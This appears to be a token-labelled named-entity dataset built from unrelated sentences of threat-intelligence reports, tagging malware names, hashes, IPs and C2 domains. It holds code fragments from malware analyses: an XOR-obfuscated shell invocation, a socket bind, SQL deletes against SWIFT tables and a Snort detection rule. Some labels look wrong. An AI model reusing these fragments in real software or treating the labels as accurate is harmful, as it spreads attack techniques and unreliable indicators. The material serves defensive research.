0x3a O
: O
0x30 O
] O

In O
addition O
, O
comprehensive O
security O
solutions O
can O
be O
used O
to O
protect O
organizations O
from O
attacks O
. O

After O
analyzing O
the O
fake O
Kik B-malware.drop
Messenger I-malware.drop
app O
, O
we O
spotted O
the O
spyware O
, O
or O
Advanced O
Persistent O
Threat O
( O
APT O
) O
. O

The O
Sofacy O
modules O
at O
this O
system O
appeared O
to O
never O
touch O
disk O
, O
and O
resemble O
the O
Linux O
Fysbis O
code O
. O

In O
order O
to O
analyze O
the O
dropper O
, O
we O
patched O
it O
. O

JPCERT/CC O
has O
been O
observing O
malicious O
shortcut O
files O
that O
are O
sent O
as O
email O
attachments O
to O
a O
limited O
range O
of O
organisations O
since O
around O
October O
2015 O
. O

After O
it O
connects O
to O
the O
tcp O
port O
, O
it O
will O
get O
4 O
bytes O
to O
apply O
for O
a O
memory O
. O

In O
the O
past O
weeks O
on O
6 O
August O
2016 O
, O
Cyberkov O
Security O
Incident O
Response O
Team O
( O
CSIRT O
) O
received O
a O
numerous O
Android O
malwares O
operating O
in O
different O
areas O
in O
Libya O
especially O
in O
Tripoli O
and O
Benghazi O
. O

Moreover O
, O
besides O
Mohamad B-malware.unknown
potentially O
being O
the O
name O
of O
the O
malware O
developer O
( O
based O
on O
PDB O
string O
found O
in O
multiple O
samples O
: O
C O
: O
\Users\ O
\Desktop\AM\programming\C\tsDownloader\Release\tsDownloader.pdb O
) O
, O
we O
do O
not O
have O
evidence O
that O
the O
attackers O
are O
Arabs O
. O

After O
gathering O
same O
hash O
from O
the O
OpenSSL O
library O
, O
we O
could O
import O
symbols O
for O
the O
matched O
functions O
. O

The O
PCC_PROXY O
: O
:ProcessPacket O

Here O
we O
have O
some O
screenshots O
that O
show O
the O
Server O
and O
the O
ZxShell B-malware.backdoor
Keylogger O
in O
action O
: O
Our O
server O
has O
accepted O
a O
connection O
from O
a O
remote O
host O
The O
ZxShell B-malware.backdoor
keylogger O
has O
captured O
2 O
user O
passwords O
( O
gmail.com O
and O
amazon.com O
) O
The O
last O
image O
shows O
a O
very O
interesting O
feature O
of O
the O
ZxShell B-malware.backdoor
keylogger O
: O
once O
installed O
and O
activated O
, O
the O
keylogger O
is O
able O
to O
catch O
each O
password O
that O
the O
user O
inserts O
in O
the O
login O
box O
of O
each O
website O
( O
like O
Google O
, O
Amazon O
and O
so O
on O
... O
) O
. O

Child O
Type O
: O
StringFileInfo O
Language/Code O
Page O
: O
1033/1200 O
CompanyName O
: O
Microsoft O
Corporation O
FileDescription O
: O
Cdto O
Netware O
2.12 O
Provider O
FileVersion O
: O
5.1.2600.0 O
( O
xpclient.010817-­‐1148 O
) O
InternalName O
: O
NEWCDTO O
LegalCopyright O
: O
Microsoft O
Corporation O
. O

So O
, O
when O
the O
user O
is O
opening O
any O
.HWP O
document O
, O
the O
malware O
program O
itself O
is O
executed O
to O
open O
the O
.HWP O
document O
. O

There O
are O
probably O
several O
actors O
that O
could O
have O
an O
interest O
in O
the O
regional O
politics O
, O
as O
the O
various O
powerblocks O
in O
the O
region O
are O
manifold O
and O
conflicted O
. O

Following O
are O
the O
hashes O
of O
the O
exploit O
file O
: O

ZxShell B-malware.backdoor
( O
aka O
Sensocode O
) O
is O
a O
Remote B-malware.drop
Administration I-malware.drop
Tool I-malware.drop
( O
RAT B-malware.drop
) O
used O
by O
Group O
72 O
to O
conduct O
cyber-espionage O
operations O
. O

In O
their O
current O
campaign O
, O
APT32 B-malware.infosteal
has O
leveraged O
ActiveMime O
files O
that O
employ O
social O
engineering O
methods O
to O
entice O
the O
victim O
into O
enabling O
macros O
. O

Figure O
20 O
. O

Prior O
research O
revealed O
607 O
domains O
related O
to O
Appin O
which O
we O
were O
able O
to O
link O
via O
historical O
passive O
DNS O
to O
1345 O
IPs O
. O

Sanitize O
and O
validate O
input O
to O
ensure O
that O
it O
is O
properly O
typed O
and O
does O
not O
contain O
escaped O
code O
. O

We O
have O
reported O
this O
' O
creative O
' O
abuse O
of O
DDE O
to O
Microsoft O
's O
security O
team O
. O

Some O
methods O
of O
attack O
are O
listed O
below O
. O

s.bind O
( O
( O
' O
0.0.0.0 O
' O
, O
443 O
) O
) O
26 O
. O

Android.Lastacloud O
( O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-4334-99 B-url.cncsvr
) O
BBOS.Lastacloud O
( O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121913-0103-99 B-url.cncsvr
) O
IOS.Lastacloud O
( O
https://www.symantec.com/security_response/writeup.jsp?docid=2014-121216-5858-99 B-url.cncsvr
) O

The O
IRONGATE B-malware.backdoor
samples O
stood O
out O
based O
on O
their O
references O
to O
SCADA O
and O
associated O
functionality O
. O

e5b781ec77472d8d4b3b4a4d2faf5761 B-hash

Profile O
of O
the O
Attackers O

We O
devised O
a O
different O
fingerprinting O
technique O
and O
scanned O
portions O
of O
the O
internet O
. O

Disable O
, O
discontinue O
, O
or O
disallow O
the O
use O
of O
Internet O
Control O
Message O
Protocol O
( O
ICMP O
) O
and O
Simple O
Network O
Management O
Protocol O
( O
SNMP O
) O
and O
response O
to O
these O
protocols O
as O
much O
as O
possible O
. O

4 O
. O

So O
to O
summarize O
, O
DarkComet B-malware.backdoor
uses O
a O
hard-coded O
( O
although O
different O
for O
each O
version O
) O
preliminary O
key O
string O
, O
such O
as O

It O
is O
interesting O
to O
note O
that O
the O
base64 O
data O
is O
subjected O
to O
some O
substitutions O
before O
it O
is O
sent O
out O
preventing O
run O
of O
the O
mill O
inspection O
on O
the O
wire O
. O

Extracting O
Intelligence O

The O
Ghost O
Dragon O
group O
modified O
the O
source O
code O
and O
changed O
the O
packet O
flag O
to O
' O
XYTvn O
' O
, O
as O
seen O
in O
Figure O
4 O
. O

It O
then O
adds O
the O
' O
Loveusd.sys O
' O
extracted O
driver O
name O
to O
the O
upper O
filter O
list O
. O

1 O
* O
Mozilla O
/4.0 O

Sure O
enough O
, O
the O
encryption O
routine O
, O
Encrypt_sub_44C34C O
( O
) O
, O
is O
functionally O
identical O
to O
the O
decryption O
routine O
, O
as O
hoped O
and O
expected O
; O
the O
only O
difference O
being O
that O
the O
Integerize_sub_44C1C0 O
( O
) O
routine O
prior O
to O
decryption O
is O
absent O
, O
and O
a O
new O
routine O
, O
which O
we O
'll O
call O
Integer2String_sub_409C6C O
( O
) O
, O
is O
called O
following O
the O
encryption O
step O
; O
this O
routine O
simply O
converts O
the O
raw O
encrypted O
data O
back O
into O
the O
ASCII O
version O
of O
its O
hexadecimal O
values O
. O

But O
this O
time O
, O
perhaps O
for O
the O
first O
time O
, O
root9B O
has O
managed O
to O
find O
where O
they O
were O
hiding O
and O
identified O
effective O
defenses O
against O
their O
intended O
attacks O
. O

Using O
Cisco O
AnyConnect O
software O
as O
a O
lure O
continues O
a O
pattern O
of O
using O
typical O
corporate O
software O
as O
a O
vehicle O
to O
infect O
victim O
machines O
. O

[ O
O.N.Mishin@chelindbank[.]ru O
] O
Transfer O
error O
, O
kindly O
reverse O
to O
us O
. O

Overview O
of O
the O
Malicious O
Email O
s O
In O
the O
The O
first O
wave O
of O
attack O
, O
The O
attackers O
spoofed O
an O
email O
id O
that O
is O
associated O
with O
Indian O
Ministry O
of O
Home O
Affairs O
( O
MHA O
) O
and O
an O
email O
was O
sent O
on O
September O
20th O
, O
2016 O
( O
just O
2 O
days O
after O
the O
Uri O
terror O
attack O
) O
to O
an O
email O
id O
associated O
with O
the O
Indian O
Embassy O
in O
Japan O
. O

The O
remote O
controller O
provides O
a O
user O
interface O
that O
allows O
attackers O
to O
send O
jobs O
to O
any O
compromised O
endpoint O
. O

What O
Bunny B-malware.unknown
, O
Babar B-malware.drop
and O
NBOT B-malware.unknown
all O
have O
in O
common O
though O
is O
that O
the O
obfuscation O
technique O
is O
easy O
to O
break O
and O
only O
applied O
to O
a O
subset O
of O
APIs O
. O

Shear O
, O
Michael O
D O
. O

As O
seen O
in O
Figure O
7 O
, O
these O
files O
are O
: O
car.dat O
( O
randomly O
generated O
name O
given O
to O
Windows O
tool O
) O
i4.dt O
( O
VBS O
script O
that O
downloads O
the O
same O
zip O
file O
) O
id O
( O
ID O
given O
to O
host O
) O
cryptui.dll O
( O
malicious O
Trojan O
) O
cryptui.dll O
( O
malicious O
Trojan O
) O

Simultaneously O
orchestrating O
multiple O
APT O
campaigns O
of O
such O
magnitude O
and O
sophistication O
takes O
time O
, O
financial O
resources O
and O
a O
large O
team O
who O
can O
support O
it O
. O

0F5DAB3EB308 O

The O
main O
purpose O
of O
the O
IGT O
tool O
is O
to O
make O
an O
inventory O
of O
the O
system O
, O
saving O
information O
from O
the O
network O
interfaces O
and O
addresses O
, O
credentials O
belonging O
to O
the O
Domain O
and O
database O
server O
, O
services O
being O
run O
from O
the O
OS O
and O
everything O
that O
could O
help O
the O
Poseidon B-malware.infosteal
Group O
make O
its O
attack O
more O
customized O
to O
its O
victim O
. O

The O
following O
are O
examples O
of O
Mimikatz B-malware.unknown
command O
line O
arguments O
detected O
during O
the O
attack O
: O
The O
stolen O
credentials O
were O
used O
to O
infect O
more O
machines O
, O
leveraging O
Windows O
built-in O
tools O
as O
well O
as O
pass-the-ticket O
and O
pass-the-hash O
attacks O
. O

APT28 B-malware.infosteal
sends O
spear O
phishing O
emails O
to O
WADA O
employees O
. O

Ch O
3.25 O
: O
ec7e3cfaeaac0401316d66e964be684e B-hash
Ch O
3.26 O
: O
b407b6e5b4046da226d6e189a67f62ca B-hash
Code O
similarity O
: O
95 O
% O
The O
version O
3.26 O
is O
the O
latest O
known O
version O
. O

After O
finalizing O
the O
analysis O
of O
the O
Android O
malware O
, O
Cyberkov O
uploaded O
it O
to O
VirusTotal O
to O
see O
if O
it O
has O
been O
uploaded O
before O
and O
what O
information O
we O
can O
get O
from O
it O
: O
Cyberkov O
discovered O
that O
the O
malware O
has O
not O
been O
uploaded O
to O
VirusTotal O
before O
and O
the O
first O
sample O
of O
this O
malware O
has O
been O
uploaded O
by O
us O
. O

We O
found O
this O
group O
running O
HTRAN O
on O
one O
of O
their O
front-end O
command O
and O
control O
servers O
. O

However O
, O
this O
looks O
to O
be O
a O
small O
part O
of O
its O
activity O
. O

The O
image O
is O
taken O
from O
a O
news O
story O
about O
Abbas O
speaking O
at O
a O
meeting O
in O
Ramallah O
. O

This O
is O
the O
same O
IP O
address O
that O
was O
cited O
in O
iSight O
's O
reporting O
of O
the O
Forbes O
breach O
. O

That O
's O
why O
the O
malware O
went O
out O
of O
control O
. O

The O
memory O
segment O
was O
dumped O
to O
disk O
for O
further O
analysis O
. O

Finally O
, O
this O
report O
offers O
a O
rare O
glimpse O
into O
what O
a O
cyber O
espionage O
APT O
looks O
like O
' O
under-the-hood O
' O
. O

However O
, O
the O
subsequent O
Diskcoder.C O
outbreak O
suggests O
that O
the O
attackers O
had O
access O
to O
the O
update O
server O
of O
the O
legitimate O
software O
. O

This O
code O
concatenates O
the O
three O
components O
of O
the O
final O
crypto O
key O
: O
the O
hard-coded O
prefix O
( O
e.g. O
, O
# O
KCMDDC42F O
# O
- O
) O
, O
the O
three-digit O
string O
890 O
that O
is O
not O
technically O
hard-coded O
but O
deterministically O
computed O
using O
the O
aforementioned O

Assuming O
Lazarus O
are O
indeed O
back O
to O
targeting O
bank O
payment O
systems O
, O
this O
will O
serve O
to O
emphasize O
the O
importance O
of O
network O
hardening O
and O
controls O
frameworks O
being O
pushed O
by O
the O
industry O
at O
present O
. O

Many O
targets O
are O
located O
in O
the O
self-declared O
separatist O
states O
of O
Donetsk O
and O
Luhansk O
, O
which O
have O
been O
classified O
as O
terrorist O
organizations O
by O
the O
Ukrainian O
government O
. O

It O
should O
be O
pointed O
out O
that O
conceptually O
, O
this O
decryption O
mechanism O
- O
both O
the O
manner O
in O
which O
the O
substitution O
table O
is O
built O
, O
as O
well O
as O
how O
it O
is O
used O
for O
XOR O
-based O
decryption O
- O
is O
very O
similar O
to O
that O
used O
by O
the O
Trojan.PonyDOS B-malware.unknown
malware O
family O
. O

All O
rights O
reserved O
. O

Figure O
5 O
: O
Contents O
of O
Decoded O
VBS O
Figure O
6 O
: O
More O
Contents O
of O
Decoded O
VBS O

This O
particular O
RAT B-malware.backdoor
employs O
simple O
and O
cunning O
techniques O
to O
prevent O
its O
discovery O
or O
further O
investigation O
. O

The O
purpose O
of O
the O
' O
Local O
' O
field O
remains O
unclear O
( O
the O
other O
possible O
value O
being O
' O
­l O
' O
) O
. O

alert O
tcp O
$ O
EXTERNAL_NET O
any O
- O
> O
$ O
HTTP_SERVERS O
$ O
HTTP_PORTS O
( O
msg O
: O
' O
China B-malware.backdoor
Chopper I-malware.backdoor
with O
all O
Commands O
Detected O
' O
; O
flow O
: O
to_ O
server O
, O
established O
; O
content O
: O
' O
FromBase64String O
' O
; O
content O
: O
' O
z O
' O
; O
pcre O
: O
' O
/Z\d O
{ O
1,3 O
} O
/i O
' O
; O
content O
: O
' O
POST O
' O
; O
nocase O
; O
http_method O
; O
reference B-url.unknown
: I-url.unknown
url I-url.unknown
, I-url.unknown
http://www.fireeye.com/blog/technical/botnet-activities-research/2013/08/ I-url.unknown
breaking-down-the-china-chopper-web-shell-part-i.html O
; O
classtype O
: O
web-application-attack O
; O
sid O
: O
900000102 O
; O
) O

2.2.1 O
. O

The O
update.msi-file O
stores O
data O
collected O
by O
the O
keylogging O
module O
. O

Resources O
include O
discussion O
points O
, O
steps O
to O
start O
evaluating O
a O
cybersecurity O
program O
, O
and O
a O
list O
of O
hands-on O
resources O
available O
to O
organizations O
. O

By O
2017 O
, O
North O
Korean O
actors O
had O
jumped O
on O
the O
cryptocurrency O
bandwagon O
. O

During O
testing O
it O
was O
found O
that O
the O
last O
hit O
was O
normally O
the O
correct O
VBR O
, O
as O
this O
would O
be O
the O
VBR O
found O
at O
the O
end O
of O
the O
volume O
. O

Spawning O
arbitrary O
processes O
. O

There O
is O
clearly O
a O
need O
for O
more O
advanced O
analytical O
systems O
to O
identify O
campaigns O
and O
link O
the O
samples O
together O
. O

At O
first O
glance O
, O
it O
looks O
as O
if O
like O
the O
main O
function O
does O
nothing O
malicious O
, O
but O
in O
fact O
it O
replaces O
the O
.text O
section O
of O
the O
legitimate O
mcoemcpy.exe O
, O
a O
side-loaded O
binary O
. O

Then O
, O
issue O
the O
dir O
command O
and O
display O
results O
to O
user O
. O

그러나 O
이들 O
악성코드가 O
실제 O
공격에 O
사용되었는지는 O
확인되 O
지 O
않았다 O
. O

Then O
create O
a O
service O
called O
' O
helpsvc O
' O
pointing O
back O
to O
Iron O
Backdoor O
dll O
. O

These O
executable O
files O
are O
lite O
droppers O
, O
maintaining O
these O
decoy O
jpeg O
files O
, O
and O
code O
to O
create O
an O
lnk O
downloader O
. O

All O
rights O
reserved O
. O

The O
basic O
information O
reported O
back O
by O
the O
malware O
would O
also O
certainly O
allow O
the O
attacker O
a O
way O
to O
triage O
infections O
to O
ensure O
they O
had O
reached O
their O
intended O
victim O
rather O
than O
a O
researcher O
. O

' O
Foundation O
Board O
Media O
Release O
: O
WADA O
Strengthens O
Anti-Doping O
Worldwide O
. O
' O

A O
previous O
, O
removed O
, O
report O
from O
another O
vendor O
claimed O
non-specific O
information O
about O
the O
groups O
' O
interest O
in O
Chinese O
universities O
, O
but O
that O
report O
has O
been O
removed O
– O
most O
likely O
detections O
were O
related O
to O
students O
' O
and O
researchers O
' O
scanning O
known O
collected O
samples O
and O
any O
' O
incidents O
' O
remain O
unconfirmed O
and O
unknown O
. O

These O
cyber O
operations O
have O
included O
spearphishing O
campaigns O
targeting O
government O
organizations O
, O
critical O
infrastructure O
entities O
, O
think O
tanks O
, O
universities O
, O
political O
organizations O
, O
and O
corporations O
leading O
to O
the O
theft O
of O
information O
. O

DWORD1 O
== O
~DWORD0 O
DWORD2 O
== O
ROR O
( O
DWORD0 O
, O
7 O
) O

By O
dropping O
the O
ntshrui.DLL O
in O
the O
directory O
C O
: O
\Windows O
, O
the O
malware O
achieves O
persistence O
. O

Unlike O
what O
is O
generally O
expected O
from O
a O
C O
& O
C O
, O
browsing O
the O
websites O
actually O
returns O
the O
following O
response O
: O
Websites O
related O
to O
this O
campaign O
use O
readymade O
bootstrap O
templates O
, O
but O
include O
unique O
and O
grammatically O
incorrect O
strings O
such O
as O
' O
Probably O
the O
most O
Music O
Site O
in O
the O
world O
! O

PCC_PROXY O
: O
:ReadWaitingData O
member O
functions O
. O

The O
malware O
in O
this O
campaign O
utilizes O
a O
known O
Ghostscript O
exploit O
( O
CVE-2017-8291— B-malware.infosteal
Intel I-malware.infosteal
Card I-malware.infosteal
) O
and O
is O
tailored O
to O
target O
only O
users O
of O
a O
Korean O
language O
word O
processor O
, O
Hancom O
's O
Hangul O
Word O
Processor O
. O

We O
have O
to O
remind O
all O
relevant O
parties O
that O
we O
are O
confronting O
with O
the O
risk O
of O
large O
scale O
diffusion O
of O
network O
armaments O
which O
is O
led O
by O
the O
low O
cost O
of O
the O
attack O
capability O
. O

The O
most O
important O
functionalities O
offered O
by O
the O
main O
component O
are O
establishment O
of O
persistence O
, O
gathering O
of O
basic O
system O
information O
, O
communication O
with O
the O
C O
& O
C O
server O
and O
the O
execution O
of O
additional O
tasks O
, O
modules O
or O
executables O
as O
commanded O
by O
the O
C O
& O
C O
server O
. O

https://play.google.com/store/apps/details?id=org.moayyad.aye.flash.app&hl=en B-url.normal
https://www.youtube.com/user/1quds/feed B-url.normal

FVEAPI.dll O

byte O
[ O
] O
array O
= O
new O
byte O
[ O
] O
115,120,127,112,99,104,99,116,112,117 O
, O
116,99,63,84,105,97,125,126,120,101 O
this.InitializeComponent O
( O
) O
; O
for O
( O
int O
i O
= O
0 O
; O
i O
< O
array.Length O
; O
i++ O
) O
array O
[ O
i O
] O
^= O
17 O
; O
if O
( O
args.get_InitParams O
( O
) O
.get_Keys O
( O
) O
.Contains O
( O
' O
shell32 O
' O
) O
) O
type.InvokeMember O
( O
' O
run O
' O
, O
256 O
, O
null O
, O
obj O
, O
new O
object O
[ O
] O
) O

Trilog.exe O
took O
one O
option O
from O
the O
command O
line O
, O
which O
was O
a O
single O
IP O
address O
of O
the O
target O
Triconex B-malware.unknown
device O
. O

However O
, O
we O
can O
notice O
the O
following O
: O
The O
configuration O
file O
( O
XML O
) O
in O
version O
1.5 O
is O
stored O
in O
Unicode O
and O
not O
in O
ASCII O
anymore O
; O
The O
two O
versions O
implement O
a O
mechanism O
to O
infect O
new O
media O
connected O
to O
the O
infected O
system O
. O

Here O
is O
the O
resemblance O
ratio O
for O
each O
version O
, O
comparing O
direct O
neighbor O
versions O
only O
, O
created O
using O
BinDiff O
: O
The O
biggest O
code O
update O
has O
occurred O
between O
version O
2.14.1 O
and O
version O
3.00 O
. O

Chien O
, O
' O
Stuxnet B-malware.backdoor
0.5 O
: O
The O
Missing O
Link O
, O
' O
Symantec O
Security O
Response O
[ O
online O
] O
26 O
February O
2013 O
, O
Available O
: O
http://www.symantec.com/content/en/us/enterprise/media/security_respo B-url.normal
nse/whitepapers/stuxnet_0_5_the_missing_link.pdf I-url.normal
N. O
Falliere O
, O
L. O
O. O
Murchu O
, O
and O
E O
. O

Size O
of O
internal O
buffer O
< O
% O
d O
> O
=xFFC O
( O
4092 O
) O
Hardcoded O
0xA0 O
< O
% O
c O
> O
= O
xA0 O
Backdoor O
identifier O
1 O
< O
% O
s O
> O
= O
' O
RB0318 O
' O
Host O
IP O
Host O
port O
OS O
version O
Hostname O
User O
name O
< O
% O
s O
> O
= O
' O
111.222.123.132 O
' O
< O
% O
d O
> O
= O
432 O
( O
1074 O
. O
) O

The O
outer O
layer O
is O
an O
encrypted O
HTTPS O
via O
an O
SSL/TLS O
connection O
using O
the O
Windows O
' O
standard O
SSL/TLS O
libraries O
. O

0491f4e55158d745fd1653950c89fcc9b37d3c1102680bd3ce67616a36bb2592 B-hash
06529ac1d3388732ebca75b8ee0adf0bc7f45d4c448ec98223dd7a258a0f1f33 B-hash
1192b5111f7c75417215a1285a20147f5ab085368fa95d74e7603d26736057ac B-hash
1192b5111f7c75417215a1285a20147f5ab085368fa95d74e7603d26736057ac B-hash
1e3966e77ad1cbf3e3ef76803fbf92300b2b88af39650a1208520e0cdc05645b B-hash
2431ff8ba00923a9c115a57e541d9d20e0a68b6cb1b48b87e7797864cf07dfab B-hash
345773dc4215c8c189d21536755614ca7b89082b96563239e363dd72c0cd8c68 B-hash
373231f5be17e09e4ce94f76b35e5be57c961d6c8a9286b2e20e203d53b3c9dd B-hash
39802d53ae4a29c528626b0870872040dc5c994fb3b6b9e4a3b982144ad56e6c B-hash
40d30bc2db27e2a8a12cdeb5aae19f04064e5a1775bd3e6cf61a7070b797d3b3 B-hash
40e9c694901aeb27993a8cd81f872076ee430e151f64af06993eb79442103ef8 B-hash
4730c6033d8644c0aae46003bab3254e4beb62187573ffb5ba5bc95a28ddcd93 B-hash
4f1923485e8cdd052467d335a6384f93cd1d50b5d927aea471e56290be29ffa3 B-hash
576ca2b0c5fe1c756c245cb82d6a2ecce7f6976d5c3f3b338f686e06955032cb B-hash
5e322d208d61dcbf17914e24103710c52878e8cf50957f3d336736f4a1851951 B-hash
652ec150db9a191942807ee5cf4772e75dfac562739477eacc6655fbec880ad7 B-hash
65af112ce229ad888bf4bbba1e3dba701e0e68c9caf81543bb395a8b8192ba8e B-hash
6eea4a67305f67cc7c016256e93eb816de32b6e9ad700f75828be9f97c28c0e0 B-hash
75ee00a36d324a89fc9ef4d7dbe606b885ec072388ef7b55d39112af7dbca665 B-hash
75f51845de4d0deae8aaab737a71bb8aed14bfa4919712bcdea212f62b70c07f B-hash
778a01389b17a8ff20c445e0856b3704ac50844faa8d36c01e0ff02518e4c6d3 B-hash
8c33b645e6362ab7e8c8a9989715193b4c9655fd576812218f3957c3fff8c429 B-hash
8d054753e0ed754398835bed794ba4fae64a2efb018f98d3c61064de8aaa231d B-hash
91d251b11c59b5e25e0c1ae55421893fce8f180a97e2eef88122c61e8cdf1bae B-hash
926a0196e4a72ed6eb20b51953cc17e8856ea9c0ef554681b7d7f0ecad870a2e B-hash
926a0196e4a72ed6eb20b51953cc17e8856ea9c0ef554681b7d7f0ecad870a2e B-hash
99e699e358be9e59cfad6124f44a96d3d1577edf9767afe17281adb37d901e22 B-hash
a91c2cad20935a85d6eed72ef663254396914811f043018732d29276424a9578 B-hash
ade5bd96bfba79051f8e8ed8fe973edd89e5f1ec6469393967c3ad7519a95650 B-hash
b002e8b6406fbdf3de9bfcb3493e61c8a44b331f53125e8fed9daa351c49fd34 B-hash
d803c4d736bcb247d23735a7160b93c2f3d98de5d432680f5eaf9212f965248c B-hash
e4381ad27b10d895ad8338ba399221d385653b83b8d5dbd5a32cb86a0c318d44 B-hash
eccb3d7d1e8a7cd27c7caf21885c95122eed28361651e8e47b8c02828b232c7e B-hash
f56c545a3157f1cf753de5ac56bb52e5af42bc6b8225d26aafdce3b430287f34 B-hash
fc49b37b879af6e675f223d324d32c894ba83952b2ee109d52bfa9bd8212e005 B-hash
f9dd8ebb062842798d53e78633ed9ca296f4a93dafb0fe60320a34a3d58d78d4 B-hash

In O
addition O
, O
the O
.RAR B-malware.drop
file O
contains O
a O
file O
in O
order O
to O
change O
the O
folder O
icon O
into O
the O
icon O
of O
the O
Windows O
thumbnail O
cache O
. O

Verizon O
Wireless O
sells O
ranges O
of O
IP O
addresses O
to O
corporate O
customers O
, O
so O
this O
is O
not O
necessarily O
an O
indication O
that O
Verizon O
Wireless O
itself O
is O
operating O
the O
server O
, O
or O
that O
Verizon O
Wireless O
customers O
are O
being O
spied O
on O
. O

6939 O
- O
HURRICANE O
- O
Hurricane O
Electric O
, O
Inc O
. O

© O
2016 O
FireEye O
, O
Inc O
. O

The O
malware O
appears O
on O
a O
victim O
's O
desktop O
as O
' O
exe.Rajab1.jpg B-malware.infosteal
' O
( O
for O
example O
) O
, O
along O
with O
the O
default O
Windows O
icon O
for O
a O
picture O
file O
without O
thumbnail O
. O

Ch O
2.03 O
: O
78d3f074b70788897ae7e20e5137bf47 B-hash
Ch O
2.11 O
: O
162f415abad9708aa61db8e03bcf2f3c B-hash
Code O
similarity O
: O
96 O
% O
The O
codes O
of O
these O
two O
versions O
are O
extremely O
similar O
to O
each O
other O
, O
we O
can O
only O
notice O
small O
changes O
: O
The O
author O
changed O
the O
name O
of O
several O
registry O
keys O
( O
probably O
to O
avoid O
detection O
by O
well-known O
IOC O
) O
; O
The O
name O
of O
two O
exported O
functions O
were O
modified O
, O
too O
: O
InstallM O
( O
) O
becomes O
AddAtomT O
( O
) O
and O
InstallS O
( O
) O
becomes O
AddAtomS O
( O
) O
, O
probably O
for O
the O
same O
reason O
than O
above O
. O

After O
successful O
authentication O
, O
the O
attacker O
is O
provided O
with O
the O
following O
page O
: O
System_web.aspx B-malware.backdoor
packs O
a O
large O
amount O
of O
functionality O
into O
a O
compact O
interface O
. O

The O
Operation B-malware.infosteal
Daybreak I-malware.infosteal
attack O
employs O
multiple O
stages O
, O
which O
are O
all O
outstanding O
in O
some O
way O
. O

APT12 O
is O
believed O
to O
be O
a O
cyber O
espionage O
group O
thought O
to O
have O
links O
to O
the O
Chinese O
People O
's O
Liberation O
Army O
. O

Coverage O
for O
known O
exploits O
and O
associated O
malware O
is O
provided O
as O
Exploit-Comele O
, O
Roarur.dr O
, O
and O
Roarur.dll O
in O
the O
5862 O
DATs O
, O
released O
January O
15 O
. O

As O
in O
the O
case O
of O
Wannacry B-malware.unknown
, O
attribution O
is O
very O
difficult O
and O
finding O
links O
with O
previously O
known O
malware O
is O
challenging O
. O

Russian O
athletes O
were O
barred O
from O
competing O
in O
the O
Olympic O
Games O
. O

Raphael O
regularly O
speaks O
on O
security O
topics O
and O
provides O
red O
team O
support O
to O
many O
cyber O
defense O
competitions O
. O

This O
cluster O
relates O
to O
the O
threat O
actor O
referred O
to O
as O
Deep O
Panda O
by O
CrowdStrike O
, O
as O
was O
confirmed O
in O
a O
recent O
blog O
post O
. O

Additional O
analysis O
into O
other O
samples O
is O
ongoing O
and O
more O
information O
will O
be O
forthcoming O
. O

https://plus.google.com/116899857642591292745/posts B-url.normal
google+ O
https://github.com/rsmudge( B-url.normal
GitHub O
) O
https://www.youtube.com/channel/UCJU2r634VNPeCRug7Y7qdcw B-url.normal
( O
youtube O
) O
http://www.oldschoolirc.com/ B-url.normal
https://twitter.com/rsmudge B-url.normal
http://www.hick.org/~raffi/index.html B-url.normal
http://www.blackhat.com/html/bh-us-12/speakers/Raphael-Mudge.html B-url.normal
http://www.linkedin.com/in/rsmudge B-url.normal
Antiy O
Labs O
is O
a O
professional O
next-generation O
security-testing O
engine O
R O
& O
D O
enterprise O
. O

Avoiding O
analysis O
? O

When O
targeting O
Arab-speaking O
counties O
, O
most O
targets O
are O
in O
Egypt O
, O
Saudi O
Arabia O
, O
The O
Palestinian O
authority O
and O
United O
Arab O
Emirates O
. O

5 O
August O
2016 O
. O

Update O
and O
patch O
production O
servers O
regularly O
. O

Here O
are O
a O
few O
key O
similarities O
between O
the O
samples O
: O
The O
PE O
timestamp O
' O
2011-07-05 O
08:25:31 O
' O
of O
the O
packer O
is O
exactly O
the O
same O
as O
the O
Bahraini O
sample O
. O

The O
malware O
is O
able O
to O
turn O
the O
Android O
phone O
into O
a O
remote O
listening O
bug O
by O
opening O
the O
Microphone O
and O
recording O
the O
audio O
then O
send O
it O
to O
the O
C2 O
. O

Some O
of O
C O
& O
C O
servers O
that O
we O
have O
seen O
from O
our O
accumulated O
data O
are O
as O
follows O
: O
• O
112.121.182.150 B-ip.unknown
• O
113.10.246.46 B-ip.unknown
• O
113.10.190.55 B-ip.unknown
• O
202.130.112.231 B-ip.unknown
• O
micoosofts.com B-url.cncsvr
• O
qtds1979 B-url.cncsvr
.3322.org I-url.cncsvr
• O
qtds1979.gicp.net B-url.cncsvr
server1.micoosofts.com B-url.cncsvr
sxl1979.gicp.net B-url.cncsvr
webmonder.gicp.net B-url.cncsvr
webposter.gicp.net B-url.cncsvr
www.yahooip.net B-url.cncsvr
www.yahooprotect.com B-url.cncsvr
www.yahooprotect.net B-url.cncsvr
yacooll.com B-url.cncsvr
• O
yahooip.net B-url.cncsvr
• O
yahooprotect.com B-url.cncsvr

The O
browser O
process O
always O
performs O
outgoing O
connections O
and O
the O
firewall O
should O
n't O
block O
them O
. O

This O
section O
describes O
the O
communications O
behavior O
of O
the O
malware O
. O

In O
some O
cases O
the O
attackers O
customise O
the O
list O
, O
presumably O
based O
on O
the O
things O
they O
're O
expecting O
to O
find O
. O

DELETE O
FROM O
SAAOWNER.MESG_%s O
WHERE O
MESG_S_UMID O
= O
' O
% O
s O
' O
; O
DELETE O
FROM O
SAAOWNER.TEXT_%s O
WHERE O
TEXT_S_UMID O
= O
' O
% O
s O
' O
; O

The O
analysed O
sample O
contained O
a O
decoy O
picture O
document O
in O
the O
resource O
section O
: O
In O
August O
2017 O
, O
the O
author O
of O
GravityRAT B-malware.drop
used O
a O
new O
variant O
of O
its O
malware O
, O
G3 O
. O

If O
this O
initial O
connection O
fails O
it O
will O
revert O
to O
the O
secondary O
backdoor O
, O
which O
utilizes O
HTTP O
GET O
and O
POST O
requests O
somewhat O
similar O
to O
the O
ones O
described O
above O
to O
the O
internal O
IP O
address O
' O
192.168.2.26 B-ip.unknown
' O
. O

The O
Lotus O
Group O
appears O
to O
have O
a O
tendency O
of O
using O
similar O
and O
even O
identical O
names O
for O
their O
payloads O
( O
seen O
in O
their O
PowerShell O
payloads O
, O
Denis B-malware.backdoor
backdoor O
and O
fake O
Flash O
installers O
) O
. O

0 O
? O

The O
locations O
: O
For O
root O
user O
path O
: O
/Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/ O

The O
code O
itself O
is O
